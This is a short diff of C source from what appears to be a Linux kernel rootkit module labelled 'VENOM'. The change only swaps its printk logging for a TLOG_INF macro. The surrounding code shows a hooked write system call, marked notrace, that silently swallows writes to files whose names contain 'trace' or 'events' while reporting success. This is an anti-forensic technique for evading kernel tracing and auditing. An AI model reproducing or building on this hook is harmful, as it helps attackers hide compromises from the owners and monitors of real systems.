@@ -48,7 +48,7 @@ notrace static asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
                 if (kernel_buf && count < BUFFER_SIZE) {
                     if (copy_from_user(kernel_buf, user_buf, count) == 0) {
                         kernel_buf[count] = '\0';
-                        printk(KERN_DEBUG "[VENOM] Blocked write to %s: %.*s\n", 
+                        TLOG_INF("[VENOM] Blocked write to %s: %.*s\n", 
                                name, (int)count, kernel_buf);
                     }
                     kfree(kernel_buf);
@@ -59,7 +59,7 @@ notrace static asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
             
             if (strstr(name, "trace") || strstr(name, "events")) {
                 fput(file);
-                printk(KERN_DEBUG "[VENOM] Blocked write to trace file: %s\n", name);
+                TLOG_INF("[VENOM] Blocked write to trace file: %s\n", name);
                 return count;
             }
         }
@@ -70,4 +70,6 @@ notrace static asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
 }
 
 #endif 
+
+
 
